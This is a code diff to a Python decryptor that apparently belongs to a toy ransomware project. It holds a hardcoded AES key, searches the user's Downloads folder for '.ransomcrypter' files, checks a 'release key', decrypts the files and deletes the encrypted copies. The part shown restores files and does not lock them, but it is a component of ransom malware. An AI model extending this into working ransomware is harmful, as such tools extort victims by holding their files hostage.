@@ -5,8 +5,44 @@ import pyaes
 from sys import argv
 from pathlib import Path
 key = "102efd86a2bec382e7945002e53505a7"
+filename_filter = ["*.ransomcrypter"]
+base_path=Path.home() / "Downloads"
+def revert(var):
+    c=int(len(var)-1)
+    msg=''
+    for i in var:
+        msg=msg+var[c]
+        c=c-1
+    return msg
+def form(var):
+    var=var.__str__()
+    c=int(len(var)-1)
+    o=r"\ ".replace(" ","")
+    msg=''
+    for g in var:
+        if var[c]==o:
+            break
+        else:
+            msg=msg+var[c]
+        c=c-1
+    msg=revert(msg)
+    msg=var.replace(msg, "")
+    return msg
+def varer():
+    pastas=[]
+    for t in filename_filter:
+        for filename in Path(base_path).rglob(t):
+            pastas.append(form(filename))
+    return pastas
 
-lst_past=["Downloads"]
+
+lst_past=varer()
+
+
+
+
+
+
 os.listdir(Path.home())
 for o in os.listdir(Path.home()):
     lst_past.append(o)
@@ -37,12 +73,15 @@ for i in lst_past:
         #download = Path.home() / "Downloads"
     except Exception:
         pass
-    os.chdir(desktop)
+    try:
+        os.chdir(desktop)
+    except Exception:
+        pass
     if __name__ == '__main__':
         if key == '102efd86a2bec382e7945002e53505a7':
             descrypt(key)
             for del_file in glob.glob('*.ransomcrypter'):
                 os.remove(f'{desktop}\\{del_file}')
-            os.system('msg * SUCCESSFULLY DESCRIPTOGRAPHED DATA')
+            #os.system('msg * SUCCESSFULLY DESCRIPTOGRAPHED DATA')
         else:
             print('Chave de liberação inválida!!!')
